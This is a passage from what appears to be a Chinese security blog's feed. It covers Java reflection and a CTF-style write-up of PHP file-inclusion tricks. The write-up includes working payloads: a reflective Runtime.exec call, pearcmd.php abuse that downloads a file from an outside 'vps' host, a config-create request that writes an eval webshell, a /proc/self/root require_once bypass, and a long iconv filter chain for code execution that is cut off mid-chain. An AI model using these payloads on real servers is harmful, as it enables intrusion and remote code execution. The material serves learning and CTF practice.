title="实例化: newInstance()"></a>实例化: newInstance()</h3><p>注意：<code>java.lang.Class.newInstance()</code>与<code>java.lang.refelct.Constructor.newInstance()</code>不同，前者是无参构造方法调用，而后者是构造方法重载调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> clazz.newInstance();<span class="hljs-comment">//无参</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-meta">@Nullable</span> Object... initargs);<br></code></pre></td></tr></table></figure><h2 id="修改final关键字修饰的属性"><a href="#修改final关键字修饰的属性" class="headerlink" title="修改final关键字修饰的属性"></a>修改final关键字修饰的属性</h2><p>被final关键字修饰的属性我们无法使用<code>set()</code>方法修改，需要借助类中的<code>modifiers</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射获取Field类的modifiers</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> field.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br><br><span class="hljs-comment">// 设置modifiers修改权限</span><br>modifiers.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 修改成员变量的Field对象的modifiers值</span><br>modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);<br><br><span class="hljs-comment">// 修改成员变量值</span><br>field.set(obj, <span class="hljs-string">&quot;edited_value&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="反射命令执行"><a href="#反射命令执行" class="headerlink" title="反射命令执行"></a>反射命令执行</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="高版本JDK下的反射"><a href="#高版本JDK下的反射" class="headerlink" title="高版本JDK下的反射"></a>高版本JDK下的反射</h2><p>@TODO</p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>反射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-文件包含的特殊姿势</title>
    <link href="/2022/11/18/ctf-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A7%BF%E5%8A%BF/"/>
    <url>/2022/11/18/ctf-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含的特殊姿势"><a href="#文件包含的特殊姿势" class="headerlink" title="文件包含的特殊姿势"></a>文件包含的特殊姿势</h1><h2 id="filter读文件绕过"><a href="#filter读文件绕过" class="headerlink" title="filter读文件绕过"></a>filter读文件绕过</h2><p>最常用的payload莫过于</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=&lt;filename&gt;<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.string.rot13/</span>resource=&lt;filename&gt;<br></code></pre></td></tr></table></figure><p>如果base、string等关键词被禁，也可以使用iconv来转换编码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.ASCII.UCS-2BE/</span>resource=&lt;filename&gt;<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.utf-8.utf-7/</span>resource=&lt;filename&gt;<br></code></pre></td></tr></table></figure><p>php支持很多编码，具体见<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">链接</a>。此外利用iconv进行多层编码转换可以实现include2shell，后面会讲到。</p><p>绕过关键词还可以使用多重url编码来绕过，因为include自带url解码。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 对base64-encode编码两次</span><br>php:<span class="hljs-regexp">//</span>filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=&lt;filename&gt;<br></code></pre></td></tr></table></figure><h2 id="pearcmd"><a href="#pearcmd" class="headerlink" title="pearcmd"></a>pearcmd</h2><p>参考<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">P牛blog</a>，pecl是管理php拓展使用的命令行工具，pear是pecl依赖的类库，我们所利用的就是pearcmd.php这个位于pecl&#x2F;pear中的文件。</p><p>首先是pecl&#x2F;pear的安装范围，即trick的使用场景：</p><ul><li>php &lt;&#x3D; 7.3 默认安装。</li><li>php &gt;&#x3D; 7.4 在编译PHP的时候指定<code>--with-pear</code>才会安装。</li><li>Docker的任意版本镜像中都被默认安装，路径在<code>/usr/local/lib/php</code>。</li></ul><h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>此参数开启的情况下，会将$_SERVER[‘argv’]当作参数执行，即我们传入的query_string可以被识别为参数选项。</p><p>我们查看pearcmd.php的参数选项</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Commands</span><span class="hljs-operator">:</span><br><span class="hljs-variable">build</span>                  <span class="hljs-variable">Build</span> <span class="hljs-variable">an</span> <span class="hljs-built_in">Extension</span> <span class="hljs-variable">From</span> <span class="hljs-built_in">C</span> <span class="hljs-variable">Source</span><br><span class="hljs-variable">bundle</span>                 <span class="hljs-variable">Unpacks</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Pecl</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">add</span>            <span class="hljs-variable">Add</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">alias</span>          <span class="hljs-variable">Specify</span> <span class="hljs-variable">an</span> <span class="hljs-variable">alias</span> <span class="hljs-variable">to</span> <span class="hljs-variable">a</span> <span class="hljs-variable">channel</span> <span class="hljs-variable">name</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">delete</span>         <span class="hljs-built_in">Remove</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span> <span class="hljs-variable">From</span> <span class="hljs-variable">the</span> <span class="hljs-built_in">List</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">discover</span>       <span class="hljs-built_in">Initialize</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span> <span class="hljs-variable">from</span> <span class="hljs-variable">its</span> <span class="hljs-variable">server</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">info</span>           <span class="hljs-variable">Retrieve</span> <span class="hljs-built_in">Information</span> <span class="hljs-variable">on</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">login</span>          <span class="hljs-variable">Connects</span> <span class="hljs-variable">and</span> <span class="hljs-variable">authenticates</span> <span class="hljs-variable">to</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">channel</span> <span class="hljs-variable">server</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">logout</span>         <span class="hljs-variable">Logs</span> <span class="hljs-variable">out</span> <span class="hljs-variable">from</span> <span class="hljs-variable">the</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">channel</span> <span class="hljs-variable">server</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">update</span>         <span class="hljs-built_in">Update</span> <span class="hljs-variable">an</span> <span class="hljs-variable">Existing</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">clear</span><span class="hljs-operator">-</span><span class="hljs-variable">cache</span>            <span class="hljs-built_in">Clear</span> <span class="hljs-variable">Web</span> <span class="hljs-variable">Services</span> <span class="hljs-variable">Cache</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">create</span>          <span class="hljs-variable">Create</span> <span class="hljs-variable">a</span> <span class="hljs-built_in">Default</span> <span class="hljs-variable">configuration</span> <span class="hljs-variable">file</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">get</span>             <span class="hljs-built_in">Show</span> <span class="hljs-variable">One</span> <span class="hljs-built_in">Setting</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">help</span>            <span class="hljs-built_in">Show</span> <span class="hljs-built_in">Information</span> <span class="hljs-variable">About</span> <span class="hljs-built_in">Setting</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">set</span>             <span class="hljs-variable">Change</span> <span class="hljs-built_in">Setting</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">show</span>            <span class="hljs-built_in">Show</span> <span class="hljs-built_in">All</span> <span class="hljs-variable">Settings</span><br><span class="hljs-variable">convert</span>                <span class="hljs-variable">Convert</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><span class="hljs-operator">.</span><span class="hljs-variable">xml</span> <span class="hljs-number">1.0</span> <span class="hljs-variable">to</span> <span class="hljs-variable">package</span><span class="hljs-operator">.</span><span class="hljs-variable">xml</span> <span class="hljs-number">2.0</span> <span class="hljs-variable">format</span><br><span class="hljs-variable">cvsdiff</span>                <span class="hljs-built_in">Run</span> <span class="hljs-variable">a</span> <span class="hljs-string">&quot;cvs diff&quot;</span> <span class="hljs-variable">for</span> <span class="hljs-variable">all</span> <span class="hljs-variable">files</span> <span class="hljs-variable">in</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">cvstag</span>                 <span class="hljs-built_in">Set</span> <span class="hljs-variable">CVS</span> <span class="hljs-built_in">Release</span> <span class="hljs-variable">Tag</span><br><span class="hljs-variable">download</span>               <span class="hljs-variable">Download</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">download</span><span class="hljs-operator">-</span><span class="hljs-variable">all</span>           <span class="hljs-variable">Downloads</span> <span class="hljs-variable">each</span> <span class="hljs-variable">available</span> <span class="hljs-variable">package</span> <span class="hljs-variable">from</span> <span class="hljs-variable">the</span> <span class="hljs-variable">default</span> <span class="hljs-variable">channel</span><br><span class="hljs-variable">info</span>                   <span class="hljs-built_in">Display</span> <span class="hljs-variable">information</span> <span class="hljs-variable">about</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">install</span>                <span class="hljs-built_in">Install</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">list</span>                   <span class="hljs-built_in">List</span> <span class="hljs-variable">Installed</span> <span class="hljs-variable">Packages</span> <span class="hljs-built_in">In</span> <span class="hljs-variable">The</span> <span class="hljs-built_in">Default</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">all</span>               <span class="hljs-built_in">List</span> <span class="hljs-built_in">All</span> <span class="hljs-variable">Packages</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">channels</span>          <span class="hljs-built_in">List</span> <span class="hljs-variable">Available</span> <span class="hljs-variable">Channels</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">files</span>             <span class="hljs-built_in">List</span> <span class="hljs-variable">Files</span> <span class="hljs-built_in">In</span> <span class="hljs-variable">Installed</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">upgrades</span>          <span class="hljs-built_in">List</span> <span class="hljs-variable">Available</span> <span class="hljs-variable">Upgrades</span><br><span class="hljs-variable">login</span>                  <span class="hljs-variable">Connects</span> <span class="hljs-variable">and</span> <span class="hljs-variable">authenticates</span> <span class="hljs-variable">to</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">server</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Deprecated</span> <span class="hljs-variable">in</span> <span class="hljs-variable">favor</span> <span class="hljs-variable">of</span> <span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">login</span><span class="hljs-punctuation">]</span><br><span class="hljs-variable">logout</span>                 <span class="hljs-variable">Logs</span> <span class="hljs-variable">out</span> <span class="hljs-variable">from</span> <span class="hljs-variable">the</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">server</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Deprecated</span> <span class="hljs-variable">in</span> <span class="hljs-variable">favor</span> <span class="hljs-variable">of</span> <span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">logout</span><span class="hljs-punctuation">]</span><br><span class="hljs-variable">makerpm</span>                <span class="hljs-variable">Builds</span> <span class="hljs-variable">an</span> <span class="hljs-variable">RPM</span> <span class="hljs-variable">spec</span> <span class="hljs-variable">file</span> <span class="hljs-variable">from</span> <span class="hljs-variable">a</span> <span class="hljs-variable">PEAR</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">package</span>                <span class="hljs-variable">Build</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">package</span><span class="hljs-operator">-</span><span class="hljs-variable">dependencies</span>   <span class="hljs-built_in">Show</span> <span class="hljs-variable">package</span> <span class="hljs-variable">dependencies</span><br><span class="hljs-variable">package</span><span class="hljs-operator">-</span><span class="hljs-variable">validate</span>       <span class="hljs-variable">Validate</span> <span class="hljs-built_in">Package</span> <span class="hljs-variable">Consistency</span><br><span class="hljs-variable">pickle</span>                 <span class="hljs-variable">Build</span> <span class="hljs-variable">PECL</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">remote</span><span class="hljs-operator">-</span><span class="hljs-variable">info</span>            <span class="hljs-built_in">Information</span> <span class="hljs-variable">About</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Packages</span><br><span class="hljs-variable">remote</span><span class="hljs-operator">-</span><span class="hljs-variable">list</span>            <span class="hljs-built_in">List</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Packages</span><br><span class="hljs-variable">run</span><span class="hljs-operator">-</span><span class="hljs-variable">scripts</span>            <span class="hljs-built_in">Run</span> <span class="hljs-variable">Post</span><span class="hljs-operator">-</span><span class="hljs-built_in">Install</span> <span class="hljs-variable">Scripts</span> <span class="hljs-variable">bundled</span> <span class="hljs-variable">with</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">run</span><span class="hljs-operator">-</span><span class="hljs-variable">tests</span>              <span class="hljs-built_in">Run</span> <span class="hljs-variable">Regression</span> <span class="hljs-variable">Tests</span><br><span class="hljs-variable">search</span>                 <span class="hljs-variable">Search</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">package</span> <span class="hljs-variable">database</span><br><span class="hljs-variable">shell</span><span class="hljs-operator">-</span><span class="hljs-variable">test</span>             <span class="hljs-variable">Shell</span> <span class="hljs-variable">Script</span> <span class="hljs-variable">Test</span><br><span class="hljs-variable">sign</span>                   <span class="hljs-built_in">Sign</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span> <span class="hljs-variable">distribution</span> <span class="hljs-variable">file</span><br><span class="hljs-variable">svntag</span>                 <span class="hljs-built_in">Set</span> <span class="hljs-variable">SVN</span> <span class="hljs-built_in">Release</span> <span class="hljs-variable">Tag</span><br><span class="hljs-variable">uninstall</span>              <span class="hljs-variable">Un</span><span class="hljs-operator">-</span><span class="hljs-variable">install</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">update</span><span class="hljs-operator">-</span><span class="hljs-variable">channels</span>        <span class="hljs-built_in">Update</span> <span class="hljs-variable">the</span> <span class="hljs-variable">Channel</span> <span class="hljs-built_in">List</span><br><span class="hljs-variable">upgrade</span>                <span class="hljs-variable">Upgrade</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">upgrade</span><span class="hljs-operator">-</span><span class="hljs-variable">all</span>            <span class="hljs-variable">Upgrade</span> <span class="hljs-built_in">All</span> <span class="hljs-variable">Packages</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Deprecated</span> <span class="hljs-variable">in</span> <span class="hljs-variable">favor</span> <span class="hljs-variable">of</span> <span class="hljs-variable">calling</span> <span class="hljs-variable">upgrade</span> <span class="hljs-variable">with</span> <span class="hljs-variable">no</span> <span class="hljs-variable">parameters</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>其中有三个选项可以利用，分别是config-create、install、download。</p><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>可以使用install以及download直接下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>peclcmd.php&amp;+install+-R+<span class="hljs-regexp">/tmp+http:/</span><span class="hljs-regexp">/vps/</span><span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>peclcmd.php&amp;+download+http:<span class="hljs-regexp">//</span>vps/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p>区别是install需要指定目录，而download会直接下载到网站根目录(不过有时候可能没有写权限)，因此<strong>用download不需要知道根目录路径更方便一些。</strong></p><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>使用config-create直接写</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd.php&amp;+config-create+<span class="hljs-regexp">/&lt;?=eval($_POST[1])?&gt;+/</span>tmp/shell.php<br></code></pre></td></tr></table></figure><p><strong>注意用burp发包，浏览器会给尖括号编码导致后端无法识别。</strong></p><h2 id="require-once绕过"><a href="#require-once绕过" class="headerlink" title="require_once绕过"></a>require_once绕过</h2><p><code>include_once</code> <code>require_once</code>对于同一个文件只能包含一次，事实上我们还可以通过&#x2F;proc&#x2F;self&#x2F;root来绕过，这是php中的一个bug，具体见<a href="https://www.anquanke.com/post/id/213235">链接</a>。</p><p>例题WMCTF2020 make php great again 2.0:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>包含了一次flag.php，无法在包含读取，使用payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><p>多层&#x2F;proc&#x2F;self&#x2F;root嵌套即可，**&#x2F;proc&#x2F;self&#x2F;root本身指向根目录**。</p><h2 id="include2shell"><a href="#include2shell" class="headerlink" title="include2shell"></a>include2shell</h2><p>参考：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>相关脚本：<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p>简而言之，结合 PHP Base64 宽松性，即使我们使用其他字符编码产生了不可见字符，我们也可以利用 <code>convert.base64-decode</code> 来去掉非法字符，留下我们想要的字符。</p><p>首先回顾一下PHP Base64，它的合法字符包括 <code>A-Za-z0-9\/\=\+</code>，不过值得注意的是php在解码base64的过程中会完全忽略非法字符(不可见字符，控制字符等)，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;\x1bY\xffQ\xfa&quot;</span>;              <span class="hljs-comment">//YQ 为 a 的 base64 编码</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">// string(1) &quot;a&quot;</span><br></code></pre></td></tr></table></figure><p>php中一个叫做<code>convert.iconv</code> 的 Filter，可以用来将数据从字符集 A 转换为字符集 B，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">// Output:</span><br><span class="hljs-comment">// some+ADwAPg-text</span><br></code></pre></td></tr></table></figure><p>在编码转换的过程中，固定字符串中的特定内容会出现变化，利用这种特性我们可以遍历所有字符集去产生我们需要的php代码的base64格式，再结合base64解码的宽松性自动删去base64中夹杂的非法字符最终实现rce。</p><p>最后一个问题就是包含文件在哪里找，要想实现include2rce我们需要知道文件的具体内容，如果data伪协议可用那么好解决，如果不可用我们就需要通过其它技巧来实现。</p><p>比如&#x2F;etc&#x2F;passwd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.EUCTW&#124;convert.iconv.L4.UTF8&#124;convert.iconv.IEC_P271.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L7.NAPLPS&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.857.SHIFTJISX0213&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.EUCTW&#124;convert.iconv.L4.UTF8&#124;convert.iconv.866.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L3.T.61&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.SJIS.GBK&#124;convert.iconv.L10.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.ISO-IR-111.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.ISO-IR-111.UJIS&#124;convert.iconv.852.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UTF16.EUCTW&#124;convert.iconv.CP1256.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L7.NAPLPS&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.851.UTF8&#124;convert.iconv.L7.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.CP1133.IBM932&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.851.BIG5&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE